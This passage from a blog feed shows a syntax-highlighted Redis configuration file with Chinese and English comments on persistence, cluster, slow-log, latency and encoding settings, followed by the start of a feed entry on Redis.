no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x5F53;&#x6B64;&#x9879;&#x4E3A;yes&#x65F6;&#xFF0C;&#x8868;&#x793A;&#x5728;&#x91CD;&#x5199;&#x65F6;&#xFF0C;&#x5BF9;&#x4E8E;&#x65B0;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E0D;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x800C;&#x6682;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;&#x5F53;&#x524D;AOF&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x4E0A;&#x6B21;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x4E8C;&#x500D;&#x65F6;&#xFF0C;&#x5219;&#x81EA;&#x52A8;&#x65E5;&#x5FD7;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x6700;&#x5C11;&#x4E3A;&#x5B9A;&#x4E49;&#x5927;&#x5C0F;&#x5219;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"></span><br><span class="line"><span class="comment"># An AOF file may be found to be truncated at the end during the Redis</span></span><br><span class="line"><span class="comment"># startup process, when the AOF data gets loaded back into memory.</span></span><br><span class="line"><span class="comment"># This may happen when the system where Redis is running</span></span><br><span class="line"><span class="comment"># crashes, especially when an ext4 filesystem is mounted without the</span></span><br><span class="line"><span class="comment"># data=ordered option (however this can&apos;t happen when Redis itself</span></span><br><span class="line"><span class="comment"># crashes or aborts but the operating system still works correctly).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Redis can either exit with an error when this happens, or load as much</span></span><br><span class="line"><span class="comment"># data as possible (the default now) and start if the AOF file is found</span></span><br><span class="line"><span class="comment"># to be truncated at the end. The following option controls this behavior.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If aof-load-truncated is set to yes, a truncated AOF file is loaded and</span></span><br><span class="line"><span class="comment"># the Redis server starts emitting a log to inform the user of the event.</span></span><br><span class="line"><span class="comment"># Otherwise if the option is set to no, the server aborts with an error</span></span><br><span class="line"><span class="comment"># and refuses to start. When the option is set to no, the user requires</span></span><br><span class="line"><span class="comment"># to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart</span></span><br><span class="line"><span class="comment"># the server.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that if the AOF file will be found to be corrupted in the middle</span></span><br><span class="line"><span class="comment"># the server will still exit with an error. This option only applies when</span></span><br><span class="line"><span class="comment"># Redis will try to read more data from the AOF file but not enough bytes</span></span><br><span class="line"><span class="comment"># will be found.</span></span><br><span class="line">aof-load-truncated yes</span><br><span class="line"></span><br><span class="line"><span class="comment">################################ LUA SCRIPTING  ###############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Max execution time of a Lua script in milliseconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If the maximum execution time is reached Redis will log that a script is</span></span><br><span class="line"><span class="comment"># still in execution after the maximum allowed time and will start to</span></span><br><span class="line"><span class="comment"># reply to queries with an error.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># When a long running script exceeds the maximum execution time only the</span></span><br><span class="line"><span class="comment"># SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be</span></span><br><span class="line"><span class="comment"># used to stop a script that did not yet called write commands. The second</span></span><br><span class="line"><span class="comment"># is the only way to shut down the server in the case a write command was</span></span><br><span class="line"><span class="comment"># already issued by the script but the user doesn&apos;t want to wait for the natural</span></span><br><span class="line"><span class="comment"># termination of the script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Set it to 0 or a negative value for unlimited execution without warnings.</span></span><br><span class="line">lua-time-limit 5000</span><br><span class="line"></span><br><span class="line"><span class="comment">################################ REDIS CLUSTER  ###############################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># WARNING EXPERIMENTAL: Redis Cluster is considered to be stable code, however</span></span><br><span class="line"><span class="comment"># in order to mark it as &quot;mature&quot; we need to wait for a non trivial percentage</span></span><br><span class="line"><span class="comment"># of users to deploy it in production.</span></span><br><span class="line"><span class="comment"># ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Normal Redis instances can&apos;t be part of a Redis Cluster; only nodes that are</span></span><br><span class="line"><span class="comment"># started as cluster nodes can. In order to start a Redis instance as a</span></span><br><span class="line"><span class="comment"># cluster node enable the cluster support uncommenting the following:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-enabled yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Every cluster node has a cluster configuration file. This file is not</span></span><br><span class="line"><span class="comment"># intended to be edited by hand. It is created and updated by Redis nodes.</span></span><br><span class="line"><span class="comment"># Every Redis Cluster node requires a different cluster configuration file.</span></span><br><span class="line"><span class="comment"># Make sure that instances running in the same system do not have</span></span><br><span class="line"><span class="comment"># overlapping cluster configuration file names.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-config-file nodes-6379.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cluster node timeout is the amount of milliseconds a node must be unreachable</span></span><br><span class="line"><span class="comment"># for it to be considered in failure state.</span></span><br><span class="line"><span class="comment"># Most other internal time limits are multiple of the node timeout.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-node-timeout 15000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A slave of a failing master will avoid to start a failover if its data</span></span><br><span class="line"><span class="comment"># looks too old.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># There is no simple way for a slave to actually have a exact measure of</span></span><br><span class="line"><span class="comment"># its &quot;data age&quot;, so the following two checks are performed:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) If there are multiple slaves able to failover, they exchange messages</span></span><br><span class="line"><span class="comment">#    in order to try to give an advantage to the slave with the best</span></span><br><span class="line"><span class="comment">#    replication offset (more data from the master processed).</span></span><br><span class="line"><span class="comment">#    Slaves will try to get their rank by offset, and apply to the start</span></span><br><span class="line"><span class="comment">#    of the failover a delay proportional to their rank.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2) Every single slave computes the time of the last interaction with</span></span><br><span class="line"><span class="comment">#    its master. This can be the last ping or command received (if the master</span></span><br><span class="line"><span class="comment">#    is still in the &quot;connected&quot; state), or the time that elapsed since the</span></span><br><span class="line"><span class="comment">#    disconnection with the master (if the replication link is currently down).</span></span><br><span class="line"><span class="comment">#    If the last interaction is too old, the slave will not try to failover</span></span><br><span class="line"><span class="comment">#    at all.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform</span></span><br><span class="line"><span class="comment"># the failover if, since the last interaction with the master, the time</span></span><br><span class="line"><span class="comment"># elapsed is greater than:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   (node-timeout * slave-validity-factor) + repl-ping-slave-period</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># So for example if node-timeout is 30 seconds, and the slave-validity-factor</span></span><br><span class="line"><span class="comment"># is 10, and assuming a default repl-ping-slave-period of 10 seconds, the</span></span><br><span class="line"><span class="comment"># slave will not try to failover if it was not able to talk with the master</span></span><br><span class="line"><span class="comment"># for longer than 310 seconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A large slave-validity-factor may allow slaves with too old data to failover</span></span><br><span class="line"><span class="comment"># a master, while a too small value may prevent the cluster from being able to</span></span><br><span class="line"><span class="comment"># elect a slave at all.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For maximum availability, it is possible to set the slave-validity-factor</span></span><br><span class="line"><span class="comment"># to a value of 0, which means, that slaves will always try to failover the</span></span><br><span class="line"><span class="comment"># master regardless of the last time they interacted with the master.</span></span><br><span class="line"><span class="comment"># (However they&apos;ll always try to apply a delay proportional to their</span></span><br><span class="line"><span class="comment"># offset rank).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Zero is the only value able to guarantee that when all the partitions heal</span></span><br><span class="line"><span class="comment"># the cluster will always be able to continue.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-slave-validity-factor 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cluster slaves are able to migrate to orphaned masters, that are masters</span></span><br><span class="line"><span class="comment"># that are left without working slaves. This improves the cluster ability</span></span><br><span class="line"><span class="comment"># to resist to failures as otherwise an orphaned master can&apos;t be failed over</span></span><br><span class="line"><span class="comment"># in case of failure if it has no working slaves.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Slaves migrate to orphaned masters only if there are still at least a</span></span><br><span class="line"><span class="comment"># given number of other working slaves for their old master. This number</span></span><br><span class="line"><span class="comment"># is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave</span></span><br><span class="line"><span class="comment"># will migrate only if there is at least 1 other working slave for its master</span></span><br><span class="line"><span class="comment"># and so forth. It usually reflects the number of slaves you want for every</span></span><br><span class="line"><span class="comment"># master in your cluster.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Default is 1 (slaves migrate only if their masters remain with at least</span></span><br><span class="line"><span class="comment"># one slave). To disable migration just set it to a very large value.</span></span><br><span class="line"><span class="comment"># A value of 0 can be set but is useful only for debugging and dangerous</span></span><br><span class="line"><span class="comment"># in production.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-migration-barrier 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># By default Redis Cluster nodes stop accepting queries if they detect there</span></span><br><span class="line"><span class="comment"># is at least an hash slot uncovered (no available node is serving it).</span></span><br><span class="line"><span class="comment"># This way if the cluster is partially down (for example a range of hash slots</span></span><br><span class="line"><span class="comment"># are no longer covered) all the cluster becomes, eventually, unavailable.</span></span><br><span class="line"><span class="comment"># It automatically returns available as soon as all the slots are covered again.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># However sometimes you want the subset of the cluster which is working,</span></span><br><span class="line"><span class="comment"># to continue to accept queries for the part of the key space that is still</span></span><br><span class="line"><span class="comment"># covered. In order to do so, just set the cluster-require-full-coverage</span></span><br><span class="line"><span class="comment"># option to no.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cluster-require-full-coverage yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In order to setup your cluster make sure to read the documentation</span></span><br><span class="line"><span class="comment"># available at http://redis.io web site.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################## SLOW LOG ###################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The Redis Slow Log is a system to log queries that exceeded a specified</span></span><br><span class="line"><span class="comment"># execution time. The execution time does not include the I/O operations</span></span><br><span class="line"><span class="comment"># like talking with the client, sending the reply and so forth,</span></span><br><span class="line"><span class="comment"># but just the time needed to actually execute the command (this is the only</span></span><br><span class="line"><span class="comment"># stage of command execution where the thread is blocked and can not serve</span></span><br><span class="line"><span class="comment"># other requests in the meantime).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You can configure the slow log with two parameters: one tells Redis</span></span><br><span class="line"><span class="comment"># what is the execution time, in microseconds, to exceed in order for the</span></span><br><span class="line"><span class="comment"># command to get logged, and the other parameter is the length of the</span></span><br><span class="line"><span class="comment"># slow log. When a new command is logged the oldest one is removed from the</span></span><br><span class="line"><span class="comment"># queue of logged commands.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The following time is expressed in microseconds, so 1000000 is equivalent</span></span><br><span class="line"><span class="comment"># to one second. Note that a negative number disables the slow log, while</span></span><br><span class="line"><span class="comment"># a value of zero forces the logging of every command.</span></span><br><span class="line">slowlog-log-slower-than 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># There is no limit to this length. Just be aware that it will consume memory.</span></span><br><span class="line"><span class="comment"># You can reclaim memory used by the slow log with SLOWLOG RESET.</span></span><br><span class="line">slowlog-max-len 128</span><br><span class="line"></span><br><span class="line"><span class="comment">################################ LATENCY MONITOR ##############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The Redis latency monitoring subsystem samples different operations</span></span><br><span class="line"><span class="comment"># at runtime in order to collect data related to possible sources of</span></span><br><span class="line"><span class="comment"># latency of a Redis instance.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Via the LATENCY command this information is available to the user that can</span></span><br><span class="line"><span class="comment"># print graphs and obtain reports.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The system only logs operations that were performed in a time equal or</span></span><br><span class="line"><span class="comment"># greater than the amount of milliseconds specified via the</span></span><br><span class="line"><span class="comment"># latency-monitor-threshold configuration directive. When its value is set</span></span><br><span class="line"><span class="comment"># to zero, the latency monitor is turned off.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default latency monitoring is disabled since it is mostly not needed</span></span><br><span class="line"><span class="comment"># if you don&apos;t have latency issues, and collecting data has a performance</span></span><br><span class="line"><span class="comment"># impact, that while very small, can be measured under big load. Latency</span></span><br><span class="line"><span class="comment"># monitoring can easily be enabled at runtime using the command</span></span><br><span class="line"><span class="comment"># &quot;CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;&quot; if needed.</span></span><br><span class="line">latency-monitor-threshold 0</span><br><span class="line"></span><br><span class="line"><span class="comment">############################# EVENT NOTIFICATION ##############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis can notify Pub/Sub clients about events happening in the key space.</span></span><br><span class="line"><span class="comment"># This feature is documented at http://redis.io/topics/notifications</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For instance if keyspace events notification is enabled, and a client</span></span><br><span class="line"><span class="comment"># performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two</span></span><br><span class="line"><span class="comment"># messages will be published via Pub/Sub:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PUBLISH __keyspace@0__:foo del</span></span><br><span class="line"><span class="comment"># PUBLISH __keyevent@0__:del foo</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is possible to select the events that Redis will notify among a set</span></span><br><span class="line"><span class="comment"># of classes. Every class is identified by a single character:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</span></span><br><span class="line"><span class="comment">#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</span></span><br><span class="line"><span class="comment">#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</span></span><br><span class="line"><span class="comment">#  $     String commands</span></span><br><span class="line"><span class="comment">#  l     List commands</span></span><br><span class="line"><span class="comment">#  s     Set commands</span></span><br><span class="line"><span class="comment">#  h     Hash commands</span></span><br><span class="line"><span class="comment">#  z     Sorted set commands</span></span><br><span class="line"><span class="comment">#  x     Expired events (events generated every time a key expires)</span></span><br><span class="line"><span class="comment">#  e     Evicted events (events generated when a key is evicted for maxmemory)</span></span><br><span class="line"><span class="comment">#  A     Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  The &quot;notify-keyspace-events&quot; takes as argument a string that is composed</span></span><br><span class="line"><span class="comment">#  of zero or multiple characters. The empty string means that notifications</span></span><br><span class="line"><span class="comment">#  are disabled.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  Example: to enable list and generic events, from the point of view of the</span></span><br><span class="line"><span class="comment">#           event name, use:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  notify-keyspace-events Elg</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  Example 2: to get the stream of the expired keys subscribing to channel</span></span><br><span class="line"><span class="comment">#             name __keyevent@0__:expired use:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  notify-keyspace-events Ex</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  By default all notifications are disabled because most users don&apos;t need</span></span><br><span class="line"><span class="comment">#  this feature and the feature has some overhead. Note that if you don&apos;t</span></span><br><span class="line"><span class="comment">#  specify at least one of K or E, no events will be delivered.</span></span><br><span class="line">notify-keyspace-events &quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">############################### ADVANCED CONFIG ###############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hashes are encoded using a memory efficient data structure when they have a</span></span><br><span class="line"><span class="comment"># small number of entries, and the biggest entry does not exceed a given</span></span><br><span class="line"><span class="comment"># threshold. These thresholds can be configured using the following directives.</span></span><br><span class="line">hash-max-ziplist-entries 512</span><br><span class="line">hash-max-ziplist-value 64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lists are also encoded in a special way to save a lot of space.</span></span><br><span class="line"><span class="comment"># The number of entries allowed per internal list node can be specified</span></span><br><span class="line"><span class="comment"># as a fixed maximum size or a maximum number of elements.</span></span><br><span class="line"><span class="comment"># For a fixed maximum size, use -5 through -1, meaning:</span></span><br><span class="line"><span class="comment"># -5: max size: 64 Kb  &lt;-- not recommended for normal workloads</span></span><br><span class="line"><span class="comment"># -4: max size: 32 Kb  &lt;-- not recommended</span></span><br><span class="line"><span class="comment"># -3: max size: 16 Kb  &lt;-- probably not recommended</span></span><br><span class="line"><span class="comment"># -2: max size: 8 Kb   &lt;-- good</span></span><br><span class="line"><span class="comment"># -1: max size: 4 Kb   &lt;-- good</span></span><br><span class="line"><span class="comment"># Positive numbers mean store up to _exactly_ that number of elements</span></span><br><span class="line"><span class="comment"># per list node.</span></span><br><span class="line"><span class="comment"># The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size),</span></span><br><span class="line"><span class="comment"># but if your use case is unique, adjust the settings as necessary.</span></span><br><span class="line">list-max-ziplist-size -2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lists may also be compressed.</span></span><br><span class="line"><span class="comment"># Compress depth is the number of quicklist ziplist nodes from *each* side of</span></span><br><span class="line"><span class="comment"># the list to *exclude* from compression.  The head and tail of the list</span></span><br><span class="line"><span class="comment"># are always uncompressed for fast push/pop operations.  Settings are:</span></span><br><span class="line"><span class="comment"># 0: disable all list compression</span></span><br><span class="line"><span class="comment"># 1: depth 1 means &quot;don&apos;t start compressing until after 1 node into the list,</span></span><br><span class="line"><span class="comment">#    going from either the head or tail&quot;</span></span><br><span class="line"><span class="comment">#    So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]</span></span><br><span class="line"><span class="comment">#    [head], [tail] will always be uncompressed; inner nodes will compress.</span></span><br><span class="line"><span class="comment"># 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]</span></span><br><span class="line"><span class="comment">#    2 here means: don&apos;t compress head or head-&gt;next or tail-&gt;prev or tail,</span></span><br><span class="line"><span class="comment">#    but compress all nodes between them.</span></span><br><span class="line"><span class="comment"># 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]</span></span><br><span class="line"><span class="comment"># etc.</span></span><br><span class="line">list-compress-depth 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets have a special encoding in just one case: when a set is composed</span></span><br><span class="line"><span class="comment"># of just strings that happen to be integers in radix 10 in the range</span></span><br><span class="line"><span class="comment"># of 64 bit signed integers.</span></span><br><span class="line"><span class="comment"># The following configuration setting sets the limit in the size of the</span></span><br><span class="line"><span class="comment"># set in order to use this special memory saving encoding.</span></span><br><span class="line">set-max-intset-entries 512</span><br><span class="line"></span><br><span class="line"><span class="comment"># Similarly to hashes and lists, sorted sets are also specially encoded in</span></span><br><span class="line"><span class="comment"># order to save a lot of space. This encoding is only used when the length and</span></span><br><span class="line"><span class="comment"># elements of a sorted set are below the following limits:</span></span><br><span class="line">zset-max-ziplist-entries 128</span><br><span class="line">zset-max-ziplist-value 64</span><br><span class="line"></span><br><span class="line"><span class="comment"># HyperLogLog sparse representation bytes limit. The limit includes the</span></span><br><span class="line"><span class="comment"># 16 bytes header. When an HyperLogLog using the sparse representation crosses</span></span><br><span class="line"><span class="comment"># this limit, it is converted into the dense representation.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A value greater than 16000 is totally useless, since at that point the</span></span><br><span class="line"><span class="comment"># dense representation is more memory efficient.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The suggested value is ~ 3000 in order to have the benefits of</span></span><br><span class="line"><span class="comment"># the space efficient encoding without slowing down too much PFADD,</span></span><br><span class="line"><span class="comment"># which is O(N) with the sparse encoding. The value can be raised to</span></span><br><span class="line"><span class="comment"># ~ 10000 when CPU is not a concern, but space is, and the data set is</span></span><br><span class="line"><span class="comment"># composed of many HyperLogLogs with cardinality in the 0 - 15000 range.</span></span><br><span class="line">hll-sparse-max-bytes 3000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in</span></span><br><span class="line"><span class="comment"># order to help rehashing the main Redis hash table (the one mapping top-level</span></span><br><span class="line"><span class="comment"># keys to values). The hash table implementation Redis uses (see dict.c)</span></span><br><span class="line"><span class="comment"># performs a lazy rehashing: the more operation you run into a hash table</span></span><br><span class="line"><span class="comment"># that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the</span></span><br><span class="line"><span class="comment"># server is idle the rehashing is never complete and some more memory is used</span></span><br><span class="line"><span class="comment"># by the hash table.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The default is to use this millisecond 10 times every second in order to</span></span><br><span class="line"><span class="comment"># actively rehash the main dictionaries, freeing memory when possible.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If unsure:</span></span><br><span class="line"><span class="comment"># use &quot;activerehashing no&quot; if you have hard latency requirements and it is</span></span><br><span class="line"><span class="comment"># not a good thing in your environment that Redis can reply from time to time</span></span><br><span class="line"><span class="comment"># to queries with 2 milliseconds delay.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># use &quot;activerehashing yes&quot; if you don&apos;t have such hard requirements but</span></span><br><span class="line"><span class="comment"># want to free memory asap when possible.</span></span><br><span class="line">activerehashing yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># The client output buffer limits can be used to force disconnection of clients</span></span><br><span class="line"><span class="comment"># that are not reading data from the server fast enough for some reason (a</span></span><br><span class="line"><span class="comment"># common reason is that a Pub/Sub client can&apos;t consume messages as fast as the</span></span><br><span class="line"><span class="comment"># publisher can produce them).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The limit can be set differently for the three different classes of clients:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># normal -&gt; normal clients including MONITOR clients</span></span><br><span class="line"><span class="comment"># slave  -&gt; slave clients</span></span><br><span class="line"><span class="comment"># pubsub -&gt; clients subscribed to at least one pubsub channel or pattern</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The syntax of every client-output-buffer-limit directive is the following:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A client is immediately disconnected once the hard limit is reached, or if</span></span><br><span class="line"><span class="comment"># the soft limit is reached and remains reached for the specified number of</span></span><br><span class="line"><span class="comment"># seconds (continuously).</span></span><br><span class="line"><span class="comment"># So for instance if the hard limit is 32 megabytes and the soft limit is</span></span><br><span class="line"><span class="comment"># 16 megabytes / 10 seconds, the client will get disconnected immediately</span></span><br><span class="line"><span class="comment"># if the size of the output buffers reach 32 megabytes, but will also get</span></span><br><span class="line"><span class="comment"># disconnected if the client reaches 16 megabytes and continuously overcomes</span></span><br><span class="line"><span class="comment"># the limit for 10 seconds.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default normal clients are not limited because they don&apos;t receive data</span></span><br><span class="line"><span class="comment"># without asking (in a push way), but just after a request, so only</span></span><br><span class="line"><span class="comment"># asynchronous clients may create a scenario where data is requested faster</span></span><br><span class="line"><span class="comment"># than it can read.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Instead there is a default limit for pubsub and slave clients, since</span></span><br><span class="line"><span class="comment"># subscribers and slaves receive data in a push fashion.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Both the hard or the soft limit can be disabled by setting them to zero.</span></span><br><span class="line">client-output-buffer-limit normal 0 0 0</span><br><span class="line">client-output-buffer-limit slave 256mb 64mb 60</span><br><span class="line">client-output-buffer-limit pubsub 32mb 8mb 60</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis calls an internal function to perform many background tasks, like</span></span><br><span class="line"><span class="comment"># closing connections of clients in timeout, purging expired keys that are</span></span><br><span class="line"><span class="comment"># never requested, and so forth.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Not all tasks are performed with the same frequency, but Redis checks for</span></span><br><span class="line"><span class="comment"># tasks to perform according to the specified &quot;hz&quot; value.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when</span></span><br><span class="line"><span class="comment"># Redis is idle, but at the same time will make Redis more responsive when</span></span><br><span class="line"><span class="comment"># there are many keys expiring at the same time, and timeouts may be</span></span><br><span class="line"><span class="comment"># handled with more precision.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The range is between 1 and 500, however a value over 100 is usually not</span></span><br><span class="line"><span class="comment"># a good idea. Most users should use the default of 10 and raise this up to</span></span><br><span class="line"><span class="comment"># 100 only in environments where very low latency is required.</span></span><br><span class="line">hz 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># When a child rewrites the AOF file, if the following option is enabled</span></span><br><span class="line"><span class="comment"># the file will be fsync-ed every 32 MB of data generated. This is useful</span></span><br><span class="line"><span class="comment"># in order to commit the file to the disk more incrementally and avoid</span></span><br><span class="line"><span class="comment"># big latency spikes.</span></span><br><span class="line">aof-rewrite-incremental-fsync yes</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x8BE6;&amp;#x89E3;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x8BE6;&amp;#x89E3;&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis概述</title>
    <link href="https://marnm.github.io//posts/18d7d749/"/>
    <id>https://marnm.github.io//posts/18d7d749/</id>
    <published>2022-06-07T04:48:52.000Z</published>
    <updated>2022-06-07T05:06:06.548Z</updated>
    
